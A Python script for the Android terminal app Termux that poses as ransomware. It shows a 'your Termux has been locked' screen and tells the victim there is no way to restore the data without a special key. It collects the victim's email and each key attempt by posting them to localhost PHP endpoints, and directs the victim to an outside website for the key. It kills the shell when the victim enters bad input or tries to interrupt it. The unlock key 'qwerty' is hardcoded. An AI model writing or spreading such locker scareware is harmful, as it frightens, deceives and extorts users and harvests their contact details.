import os,time,requests
from colorama import Fore, Back,Style

red='\033[1;91m'
green='\033[1;92m'
blue='\033[1;34m'
yellow='\033[1;33m'
cyan='\033[1;96m'
reset='\033[0m'

#os.system("mpv a/mm.mp3")


def cle():
    os.system("clear")

def home():
    cle()
    print(red)
    os.system("figlet _HACK YOU_")
    print(" A7h9l1b8i")
    print(" ")
    

        

    
    
        
        
def msg():
    print(" ")
    print(" ")
    print(green+"_______________________________________________________")
    print(red+".....HACK YOUR TERMUX.....")
    print(green+"_______________________________________________________")
    
    print(" ")
    print(" ")
    print(Back.GREEN+Fore.RED+" Ooops Your Termux hav been locked.")
    print(Style.RESET_ALL)
    print(green+"________________________________________________________")
    print(reset)
    print(green+f" You Become Victim of the A7h9l1b8i virus \n")
    print(green+"________________________________________________________")
    print(red+f"Your Termux files hav been locked\nThere Is Not Way To Restore Your Termux data Without a Special Key\nYou can get thi key following Thi steps..")
    
    
name=""








try:
    home()
    msg()
    print(" ")
    print(" ")
    
    print(green+"[1]"+red+" enter your email we will contact you...")
    
    
    print(" ")
    name=input(green+"enter your email : "+reset)

    if "@" in name:
        print("successful")
        em={"email":name}
        try:
            m=requests.post("http://localhost:8000/email.php",params=em)
            print(m.status_code)
            
        except requests.exceptions.RequestException as e:
            
            pass
        
        
    else:
        print(yellow+"sory "+red+name+yellow+" this is not valid email please enter valid email  "+reset)
        os.system('killall -9 /data/data/com.termux/files/usr/bin/bash')
    
    
except:
    os.system('killall -9 /data/data/com.termux/files/usr/bin/bash')
    
    

i=0

while(1):
    try:
        i=i+1
        home()
        msg()
        print(" ")
        if i>3:
            print(" ")
            print(green+"[*]"+yellow+" Visiting this website will give you the key to unlock termux")
            
            print(reset)
            print(red+"×××××"+green+" https://akhilabhi.github.io/alltoolweb/ "+red+"×××××"+reset)
           
        else:
            print(" ")
        
        print(" ")
        print(" ")
        print("")
        user=input(red+"ente private key : "+reset)
        try:
            pay={"name":user}
            r = requests.post("http://localhost:8000/test.php",params=pay)
            print(r.status_code)
        except requests.exceptions.RequestException as e:
            
            pass
        
        
            
        
        
        
        
        
        #print(user)
        usr="qwerty"
        #print(ppa)
        if user==usr:
            os.system("bash r.sh")
            exit()
        else:
            print(" ")
            print(" ")
            print(" ")
            print(red+"[×] "+yellow+"key name not maching")
            print(" ")
            print(" ")
            
    except Exception:
        os.system('killall -9 /data/data/com.termux/files/usr/bin/bash')
    except KeyboardInterrupt:
        os.system('killall -9 /data/data/com.termux/files/usr/bin/bash')
    
